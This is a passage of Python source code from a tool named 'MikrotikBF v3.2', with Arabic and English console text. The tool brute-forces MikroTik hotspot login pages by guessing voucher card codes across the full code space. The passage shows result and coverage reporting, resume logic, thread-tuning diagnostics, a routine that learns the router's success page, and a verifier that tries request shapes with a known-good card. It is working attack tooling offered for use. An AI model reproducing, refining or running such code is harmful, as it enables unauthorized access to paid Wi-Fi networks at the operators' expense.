        elif p['network_type'] == '2':
            print(f'   {cyan}Card/User+Pass :{green} {u}')
        else:
            print(f'   {cyan}Card/Code :{green} {u}')
        print(f'''   {cyan}Tested   :{white} {shared["tested"]} attempts
   {cyan}Errors   :{white} {shared["errors"]}
   {cyan}Time     :{white} {mins}m {secs}s
''')
    else:
        print(f'''
 {red}╔══════════════════════════════════════════╗
 ║        ✗ NOT FOUND                       ║
 ╚══════════════════════════════════════════╝{white}
   {gray}Tested: {shared["tested"]} | Errors: {shared["errors"]} | Time: {mins}m {secs}s{white}''')

    space = shared.get('space', 0)
    sent = shared.get('sent', shared['tested'])
    start = shared.get('start_pos', 0)
    covered = min(start + sent, space) if space else 0
    pct = (covered / space * 100.0) if space else 0.0
    print(f''' {cyan}COVERAGE{white}
   الفضاء الكامل          : {fmt_int(space) if space else "?"} احتمال
   موضع البداية           : {fmt_int(start)}
   كروت مختلفة جُرّبت     : {fmt_int(sent)} (بلا أي تكرار)
   إجمالي طلبات HTTP      : {fmt_int(shared["tested"])} (يشمل إعادة إرسال الفاشلة)
   كروت لم يصل طلبها أبداً : {fmt_int(shared.get("failed_cards", 0))} (فشلت كل الإعادات)
   ردود HTTP مقروءة       : {fmt_int(shared.get("responses", 0))}
   التغطية التراكمية      : {fmt_int(covered)} / {fmt_int(space)} = {pct:.2f}%''')
    if shared.get('failed_cards'):
        print(f' {yellow}⚠ {shared["failed_cards"]} كارت فشل إرسالها 4 مرات متتالية '
              f'ولم تصل للراوتر — فهي غير مغطّاة فعلياً. أعد الجولة (ستُجرَّب '
              f'ضمن الجولة القادمة) أو قلّل الـThreads لتقليل الفقد.{white}')

    print_error_report(shared, threads_count)

    if not shared['found']:
        if space and pct >= 99.999 and shared.get('failed_cards'):
            print(f'''{yellow} ⚠ التغطية 100% لكن {shared["failed_cards"]} كارت لم يصل
   طلبها للراوتر أبداً — فهي ليست مغطّاة فعلياً. أعد نفس الجولة
   (سيكمل من حيث توقف ويمرّ عليها) قبل أي استنتاج.{white}
''')
        elif space and pct >= 99.999:
            print(f'''{red} ╔══════════════════════════════════════════════════════╗
 ║  ✓ تم تجريب كل الاحتمالات الممكنة — واحدة واحدة       ║
 ╚══════════════════════════════════════════════════════╝{white}
   {white}بما أن كل الكروت الممكنة جُرّبت ولم ينجح أي منها، فالمشكلة
   ليست في التخمين ولا في "حظ" الأرقام. الأسباب الباقية:
     1) شكل الطلب مرفوض (باسورد مطلوب / POST بدل GET / dst-popup)
     2) الراوتر يرفض الكارت نفسه (منتهي/غير مُنشّأ/محجوب الجهاز)
     3) كشف النجاح لا يعمل (صفحة نجاح لا تحتوي /status)
   {cyan} → شغّل الخيار 5 (Verify with a known-good card) الآن: يجيب
     على الثلاثة في 9 طلبات، ولو عندك كارت صحيح واحد معروف.
   {gray} لا داعي لتكرار الهجوم على نفس الفضاء — سيعيد نفس الاحتمالات.{white}
''')
        elif space and pct >= 60:
            print(f'''   {yellow}تغطية {pct:.1f}% — لم يُستنفد الفضاء بعد. أعد التشغيل بنفس
   الإعدادات وسيكمل من {fmt_int(covered)} بدل البدء من الصفر
   (لأنه لا يكرر ما جرّبه). أو اطلب {fmt_int(space - covered)} محاولة
   لتغطية الباقي كاملاً.{white}
''')
        else:
            print(f'''   {yellow}جرب:{white} زيادة المحاولات • مراجعة GET/POST (F12)
        • مراجعة طول/بادئة الكارت • تعليم صفحة النجاح
        • أو الخيار 5: تجربة كارت صحيح معروف للتأكد من شكل الطلب
''')
    input(f'{yellow} Press [Enter] to continue...{white}')

def _shape_send(p, method, user, pw, extras):
    """يرسل طلباً بشكل محدد دون تعديل البروفايل الأصلي."""
    q = dict(p)
    q['method'] = method
    q['extras'] = extras
    return send_login(q, user, pw, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT))


def _describe_resp(resp, base):
    """تفاصيل طلب واحد مقارنةً بصفحة الدخول الأصلية."""
    url = resp.url or ''
    html = resp.text or ''
    low = html.lower()
    fail = next((f for f in FAILURE_SIGNS if f in low), None)
    same_path_as_base = bool(base) and same_path(url, base['url'])
    size_same = base is not None and abs(len(html) - base['len']) <= 40
    return {
        'status': getattr(resp, 'status_code', 0),
        'url': url,
        'len': len(html),
        'fail': fail,
        'login_page': same_path_as_base and size_same,
        'status_page': '/status' in url.lower(),
        'text': html,
    }


def verify_flow():
    db = load_db()
    p = choose_profile(db)
    if p is None:
        return
    idx = p.pop('__index__', None)

    print(f'''{cyan}
 ┌─ Verify with a known-good card (Menu 5) ────┐
 │ {gray}عندك كارت صحيح تعرفه؟ هذه الشاشة تجرّبه   │
 │ {gray}على 8 أشكال طلب مختلفة وتقول لك بالضبط    │
 │ {gray}أين المشكلة: الشكل؟ الكشف؟ أم الكارت؟      │{white}
{cyan} └─────────────────────────────────────────────┘{white}''')

    good = input(' Known-good card/username : ').strip()
    if not good:
        print(f'{red} ✗ Cancelled.{white}')
        input(f'{gray} Enter to continue...{white}')
        return
    pwx = input(' Password for it (Enter = same as card, "-" = none) : ').strip()
    if pwx == '-':
        pw_list = [None]
    elif pwx == '':
        pw_list = [None, good]
    else:
        pw_list = [pwx]

    print(f'{yellow} ⟳ Fetching the plain login page (baseline)...{white}')
    try:
        b = test_connection(p['login_url'])
        base = {'url': b.url or p['login_url'], 'len': len(b.text or '')}
        print(f'{green} ✓ Baseline: HTTP {b.status_code} | {base["len"]} bytes | '
              f'{base["url"]}{white}')
    except Exception as e:
        kind, short = classify_error(e)
        print(f'{red} ✗ Cannot reach the login page [{kind}]: {short}{white}')
        input(f'{gray} Enter to continue...{white}')
        return
    wrong = ''.join(choices('zqx9', k=max(6, len(good))))
    wrong_d = None
    try:
        wresp = _shape_send(p, p.get('method', '1'), wrong, wrong, True)
        wrong_d = _describe_resp(wresp, base)
    except Exception:
        pass
    shapes = []
    for method, mname in (('1', 'GET '), ('2', 'POST')):
        for extra in (True, False):
            tag = '+dst-popup' if extra else 'plain    '
            shapes.append((method, extra, None, f'{mname} {tag} user-only'))
            for v in pw_list:
                if v:
                    shapes.append((method, extra, v,
                                   f'{mname} {tag} user+pass'))

    print(f'\n {cyan}Testing {len(shapes)} request shapes with the '
          f'known-good card...{white}\n')
    print(f' {gray}{"shape":<32} {"HTTP":<5} {"size":<7} verdict{white}')
    print(f' {gray}{"-" * 82}{white}')
    results = []
    for method, extra, pwv, label in shapes:
        try:
            r = _shape_send(p, method, good, pwv, extra)
            d = _describe_resp(r, base)
        except Exception as e:
            kind, _ = classify_error(e)
            d = {'status': 0, 'url': f'[{kind}]', 'len': 0, 'fail': None,
                 'login_page': False, 'status_page': False, 'text': ''}
        d.update(method=method, extra=extra, pwv=pwv, label=label)
        if d['status_page']:
            verdict = 'SUCCESS — redirected to /status'
        elif d['fail']:
            verdict = f'rejected ({d["fail"][:26]})'
        elif d['login_page']:
            verdict = 'login page again (no error text)'
        elif (wrong_d and d['len'] == wrong_d['len']
              and d['url'] == wrong_d['url']):
            verdict = 'identical to wrong-card reply'
        elif d['len'] != base['len']:
            verdict = 'DIFFERENT page — inspect'
        else:
            verdict = 'same size as login page'
        d['verdict'] = verdict
        results.append(d)
        print(f' {white}{label:<32} {d["status"]:<5} {d["len"]:<7} {verdict}{white}')

    print(f'\n {cyan}VERDICT{white}')
    winners = [d for d in results if d['status_page']]
    differs = [d for d in results
               if not d['status_page'] and not d['login_page'] and not d['fail']
               and d['len'] != base['len']]
    rejected_all = all((d['fail'] or d['login_page']) for d in results)

    if winners:
        w = winners[0]
        print(f''' {green}✓ شكل الطلب الصحيح: {w["label"].strip()}
   الراوتر قبل الكارت وحوّلك إلى صفحة /status → كشف النجاح يعمل،
   ومعنى ذلك أن فشلك السابق كان تغطية ناقصة للأرقام فقط
   (تكرار الكروت) — وهو ما أصلحته النسخة 3.2.{white}''')
    elif differs:
        d = differs[0]
        print(f''' {yellow}▲ لا تحويل إلى /status، لكن الرد على الكارت الصحيح
   مختلف فعلاً عن صفحة الدخول ({d["len"]} بايت بدل {base["len"]}).
   أي أن الطلب نجح والراوتر أعاد صفحة نجاح بشكل مختلف (JS/Popup)،
   وكشف النجاح عندك لا يعرفها → لهذا لم يظهر MATCH FOUND.{white}''')
        print(f' {gray}   final URL: {d["url"]}{white}')
    elif rejected_all:
        print(f''' {red}✗ كل الأشكال الثمانية رفضت الكارت الصحيح نفسه.
   هذا يعني أن المشكلة ليست في الأداة ولا في شكل الطلب، بل أحد:
     1) الكارت منتهي أو لم يُنشأ/يُفعّل بعد في الراوتر
     2) جهازك محجوب (ip-binding blocked) أو الراوتر لا يقبل تسجيلاً جديداً
     3) الرابط ليس صفحة دخول الـhotspot الصحيحة
   {gray}   افتح صفحة الدخول في المتصفح وسجّل بالكارت يدوياً:
   إن رُفض في المتصفح أيضاً → المشكلة في الكارت/الشبكة لا في الأداة.{white}''')
    else:
        print(f''' {yellow}▲ الردود لا تُظهر نجاحاً ولا رفضاً واضحاً.
   راجع أن الكارت الصحيح مكتوب صحيحاً وأن الرابط هو صفحة الدخول فعلاً.{white}''')
    learn_src = winners[0] if winners else (differs[0] if differs else None)
    if learn_src and idx is not None:
        print(f'''\n {cyan}يمكن الآن تعليم الأداة صفحة النجاح من هذا الرد
   (بدل الاعتماد على /status وحدها — أدق بكثير).{white}''')
        if ask_yn(' → Apply this shape + learn the success page?',
                  default_yes=True):
            prof = db['profiles'][idx]
            prof['method'] = learn_src['method']
            prof['extras'] = learn_src['extra']
            prof['last_used'] = datetime.now().strftime('%Y-%m-%d %H:%M')
            sig = extract_signature(learn_src['text'],
                                    wrong_d['text'] if wrong_d else '')
            if sig:
                prof['success_signature'] = sig
            if learn_src['url']:
                prof['success_url'] = learn_src['url']
            if save_db(db):
                print(f' {green}✓ Saved: '
                      f'method={"POST" if learn_src["method"] == "2" else "GET"}, '
                      f'extras={learn_src["extra"]}, signature={len(sig)} words'
                      f'{white}')

    input(f'{yellow} Press [Enter] to continue...{white}')

def _probe(p, n, threads_count, label):
    """يرسل n محاولة ببيانات خاطئة (لا يخمّن شيئاً) ويقيس فقط."""
    lock = threading.Lock()
    stop_event = threading.Event()
    stats = {'n': 0, 'err': 0, 'kinds': Counter(), 'codes': Counter(),
             'lat': [], 'retried': 0}

    def one():
        u = ''.join(choices('zqx9', k=10))
        t0 = time.time()
        try:
            r = send_login(p, u, u, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT))
        except Exception as e:
            kind, _ = classify_error(e)
            with lock:
                stats['err'] += 1
                stats['kinds'][kind] += 1
                stats['n'] += 1
            return
        with lock:
            stats['n'] += 1
            stats['lat'].append(round((time.time() - t0) * 1000))
            stats['codes'][r.status_code] += 1
            if getattr(_tls, 'retried', False):
                stats['retried'] += 1

    t0 = time.time()
    if threads_count <= 1:
        for _ in range(n):
            if stop_event.is_set():
                break
            one()
    else:
        q = queue.Queue(maxsize=max(10, threads_count * 2))

        def worker():
            while True:
                try:
                    q.get(timeout=0.25)
                except queue.Empty:
                    return
                try:
                    one()
                finally:
                    q.task_done()

        ws = [threading.Thread(target=worker, daemon=True)
              for _ in range(threads_count)]
        for w in ws:
            w.start()
        for _ in range(n):
            q.put(1)
        q.join()

    el = max(time.time() - t0, 0.001)
    err_rate = stats['err'] / max(stats['n'], 1) * 100.0
    avg = sum(stats['lat']) / len(stats['lat']) if stats['lat'] else 0
    print(f'\n {cyan}{label}{white}')
    print(f'   requests {stats["n"]:<6} errors {stats["err"]:<6} '
          f'({err_rate:5.1f}%)   speed {stats["n"] / el:5.1f}/s   '
          f'avg latency {avg:.0f} ms')
    if stats['codes']:
        print(f'   {gray}HTTP: '
              f'{", ".join(f"{c}x{n}" for c, n in stats["codes"].most_common(5))}'
              f'{white}')
    if stats['kinds']:
        print(f'   {yellow}errors: '
              f'{", ".join(f"{k} x{n}" for k, n in stats["kinds"].most_common(5))}'
              f'{white}')
    if stats['retried']:
        print(f'   {green}auto-retried: {stats["retried"]}{white}')
    return stats, err_rate


def diagnose_flow():
    db = load_db()
    p = choose_profile(db)
    if p is None:
        return

    print(f'''{cyan}
 ┌─ Diagnostics (read-only, no guessing) ──────┐
 │ {gray}يرسل طلبات ببيانات خاطئة عمداً لقياس الحالة│
 │ {gray}الشبكية فقط: تأخير، أخطاء، رموز HTTP.      │
 │ {gray}لا يحاول أي كارت ولا يستهلك محاولات.       │{white}
{cyan} └─────────────────────────────────────────────┘{white}''')

    print(f'{yellow} ⟳ Reachability test...{white}')
    t0 = time.time()
    try:
        r = test_connection(p['login_url'])
        print(f'{green} ✓ HTTP {r.status_code} in '
              f'{(time.time() - t0) * 1000:.0f} ms{white}')
    except Exception as e:
        kind, short = classify_error(e)
        print(f'{red} ✗ Unreachable [{kind}]: {short}{white}')
        print(f'{gray}   → {ERROR_HINTS.get(kind, "")}{white}')
        print(f'{yellow}   لا فائدة من أي تخمين قبل إصلاح الوصول للرابط.{white}')
        input(f'{gray} Enter to continue...{white}')
        return

    s1, r1 = _probe(p, 30, 1, 'A) Sequential — 1 thread / 30 requests')

    default_t = int(p.get('threads', 20))
    t = ask_int(f'{white} → Threads to compare against '
                f'{green}(Enter={default_t}){white} : ',
                default=default_t, minv=1, maxv=100)
    s2, r2 = _probe(p, max(60, t * 3), t,
                    f'B) Parallel — {t} threads / {max(60, t * 3)} requests')

    print(f'\n {cyan}DIAGNOSIS{white}')
    if s1['err'] == 0 and s2['err'] == 0:
        print(f''' {green}✓ The link is clean at both settings.
   أي أخطاء تراها في وضع الهجوم إذن ليست من الشبكة — راجع الرابط/الطريقة.{white}''')
    elif r2 > r1 * 2 and r2 > 3:
        rec = max(4, min(t // 2, 40))
        print(f''' {yellow}▲ الأخطاء تزيد مع الـThreads ({r1:.1f}% → {r2:.1f}%).
   هذا ضغط على الراوتر/الجهاز، وليس حظراً ولا كروت منتهية.
   {t} → جرّب {rec} thread: السرعة الحقيقية غالباً لن تنقص
   لأن الراوتر هو العنق، والأخطاء ستقل كثيراً.{white}''')
    elif r1 > 3 and s1['err'] >= 3:
        print(f''' {yellow}▲ الأخطاء موجودة حتى بـ thread واحد
   ({r1:.1f}% = {s1["err"]} من {s1["n"]} طلب).
   الشك هنا في المسار نفسه: واي فاي ضعيف، AP وسيط، أو الراوتر نفسه
   تحت ضغط/RADIUS بطيء. تقليل الـThreads لن يحلّها.{white}''')
    elif r1 > 3:
        print(f''' {green}✓ خطأ أو اثنان بـ thread واحد
   ({s1["err"]} من {s1["n"]}) = ضوضاء عادية، لا حكم منها.
   الأخطاء تظهر مع التوازي ({r2:.1f}%) → ضغط على الراوتر لا حظر.{white}''')
    else:
        print(f' {green}✓ الفرق طبيعي: {r1:.1f}% → {r2:.1f}%.{white}')

    if s2['kinds'].get('stale_keepalive'):
        print(f' {gray}ملاحظة: {s2["kinds"]["stale_keepalive"]} من الأخطاء كانت '
              f'اتصالات keep-alive قديمة (تُعاد تلقائياً) — أثرها صفر.{white}')
    input(f'{gray} Enter to continue...{white}')


def choose_profile(db):
    profiles = db['profiles']
    if not profiles:
        print(f'{yellow} ⚠ No saved profiles. Create one first (option 2).{white}')
        input(f'{gray} Enter to continue...{white}')
        return None

    order = sorted(range(len(profiles)),
                   key=lambda i: profiles[i].get('last_used', ''), reverse=True)
    print(f'\n {cyan}Saved networks:{white}')
    for n, i in enumerate(order, 1):
        pr = profiles[i]
        mark = (green + '✓' + white if pr.get('success_signature')
                else gray + '—' + white)
        sp = _profile_space(pr) if pr.get('network_type') else 0
        print(f'  {n}) {pr["name"]:<22} {gray}{pr["login_url"]}  '
              f'space:{fmt_int(sp)}  learned:{mark}')
    print(f'  0) back')

    while True:
        c = input(f'{white} → choose : ').strip()
        if c == '0':
            return None
        if c.isdigit() and 1 <= int(c) <= len(order):
            idx = order[int(c) - 1]
            break
        print(f'{red} ✗ Invalid.{white}')

    p = deepcopy(profiles[idx])
    print_profile_summary(p)

    new = input(f'{white} → New URL {green}(Enter = keep current){white} : ').strip()
    if new:
        p['login_url'] = normalize_url(new)
    print(f'{yellow} ⟳ Testing connection...{white}')
    try:
        r = test_connection(p['login_url'])
        print(f'{green} ✓ Connected! (HTTP {r.status_code}){white}')
    except Exception as e:
        kind, short = classify_error(e)
        print(f'{red} ✗ Cannot reach target [{kind}]: {short}{white}')
        print(f'{gray}   → {ERROR_HINTS.get(kind, "")}{white}')
        input(f'{gray} Enter to continue...{white}')
        return None
    p['__index__'] = idx
    return p


def use_profile_flow():
    db = load_db()
    p = choose_profile(db)
    if p is None:
        return
    idx = p.pop('__index__')
    profiles = db['profiles']

    walk, space, _ = get_walk(p)
    remaining = max(space - int(walk.get('pos', 0)), 0) or space
    dflt = remaining if remaining <= 2_000_000 else None
    hint = f'space {fmt_int(space)}'
    if dflt:
        hint += f', Enter = cover all {fmt_int(dflt)}'
    count = ask_int(f'{white} → Attempts {green}({hint}){white} : ', default=dflt)

    threads_count = ask_int(f'{white} → Threads {green}(Enter = saved){white} : ',
                            default=p.get('threads', 20), minv=1, maxv=100)
    if threads_count > 60:
        print(f'{yellow} ⚠ {threads_count} threads على راوتر hotspot عادي = '
              f'أخطاء أكثر وسرعة أقل. Menu 4 يقيس لك الفرق قبل الهجوم.{white}')
    p['threads'] = threads_count

    if p.get('success_signature') or p.get('success_url'):
        print(f' {green}✓ Using learned success page automatically.{white}')
        keyword = input(f'{white} → Extra keyword {green}(Enter = none){white} : ').strip()
    else:
        keyword = input(f'{white} → Success Keyword {green}(Enter = status){white} : ').strip() or 'status'

    shared = attack(p, count, threads_count, keyword)
    show_result(shared, p, threads_count)
    profiles[idx]['walk'] = p.get('walk')
    profiles[idx]['threads'] = threads_count
    profiles[idx]['last_used'] = datetime.now().strftime('%Y-%m-%d %H:%M')
    save_db(db)


def create_profile_flow():
    p = {}
    print(f'\n {cyan}── New Profile ──{white}\n')
    if not ask_url_and_test(p):
        return
    ask_method_and_fields(p)
    ask_network_shape(p)
    p['threads'] = ask_int(f'{white} → Default threads {green}(Enter=20){white} : ',
                           default=20, minv=1, maxv=100)

    keyword = ''
    if ask_yn(f'{yellow} → Teach me the SUCCESS page now? '
              f'{gray}(بيانات صحيحة معروفة){white}', default_yes=False):
        if learn_success_page(p):
            keyword = ''  
    if not keyword and not (p.get('success_signature') or p.get('success_url')):
        keyword = input(f'{white} → Success Keyword {green}(Enter = status){white} : ').strip() or 'status'
    p['keyword'] = keyword

    if ask_yn(f'{yellow} → Run diagnostics before attacking? {gray}(موصى به)',
              default_yes=True):
        _probe(p, 30, 1, 'A) Sequential — 1 thread / 30 requests')
        _probe(p, max(60, p['threads'] * 3), p['threads'],
               f'B) Parallel — {p["threads"]} threads')

    if ask_yn(f'{yellow} → Save this profile?', default_yes=True):
        db = load_db()
        names = {pr['name'] for pr in db['profiles']}
        suggested = urlparse(p['login_url']).netloc or 'network'
        while True:
            name = input(f'{white} → Profile name {green}(Enter = {suggested}){white} : ').strip() or suggested
            if name not in names:
                break
            print(f'{red} ✗ الاسم مستخدم، اختر اسماً آخر.{white}')
        p['name'] = name
        p['created'] = datetime.now().strftime('%Y-%m-%d %H:%M')
        p['last_used'] = p['created']
        db['profiles'].append(p)
        if save_db(db):
            print(f' {green}✓ Saved to {os.path.basename(DB_FILE)}{white}')

    walk, space, _ = get_walk(p)
    remaining = max(space - int(walk.get('pos', 0)), 0) or space
    dflt = remaining if remaining <= 2_000_000 else None
    hint = f'space {fmt_int(space)}'
    if dflt:
        hint += f', Enter = cover all {fmt_int(dflt)}'
    count = ask_int(f'{white} → Attempts {green}({hint}){white} : ', default=dflt)
    shared = attack(p, count, p['threads'], keyword)
    show_result(shared, p, p['threads'])
    if p.get('name') in {pr.get('name') for pr in db['profiles']}:
        save_db(db)   

def manage_profiles_flow():
    db = load_db()
    profiles = db['profiles']
    if not profiles:
        print(f'{yellow} ⚠ No saved profiles.{white}')
        input(f'{gray} Enter to continue...{white}')
        return
    print(f'\n {cyan}Saved profiles:{white}')
    for n, pr in enumerate(profiles, 1):
        print(f'  {n}) {pr["name"]:<22} {gray}{pr["login_url"]}{white}')
    print(f'  0) back')
    c = input(f'{white} → Delete number : ').strip()
    if c.isdigit() and 1 <= int(c) <= len(profiles):
        name = profiles[int(c) - 1]['name']
        if ask_yn(f'{red} → Delete "{name}"?', default_yes=False):
            profiles.pop(int(c) - 1)
            save_db(db)
            print(f' {green}✓ Deleted.{white}')
    input(f'{gray} Enter to continue...{white}')

def main():
    clear_screen()
    print(f'''{green}
  ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
{white}   MikrotikBF v3.2
{white}   Developer : ENG.YOUSEF
{green}  ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■{gray}{green}
''')

    while True:
        print(f'''{cyan}
  ┌──────────────── Main Menu ────────────────┐{white}
   1) Use saved profile      {white}
   2) New profile + save     {white}
   3) Manage profiles        {white}
   0) Exit
{cyan}  └───────────────────────────────────────────┘{white}''')
        c = input(f'{white} → choice : ').strip()
        if c == '1':
            use_profile_flow()
        elif c == '2':
            create_profile_flow()
        elif c == '3':
            manage_profiles_flow()
        elif c in ('0', 'q', 'exit'):
            print(f'\n {green}Bye 👋{white}')
            break
        else:
            print(f'{red} ✗ Invalid choice.{white}')
    try:
        input(f'{gray} Press [Enter] to close...{white}')
    except KeyboardInterrupt:
        pass


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n{yellow} ✋ Interrupted — bye.{white}')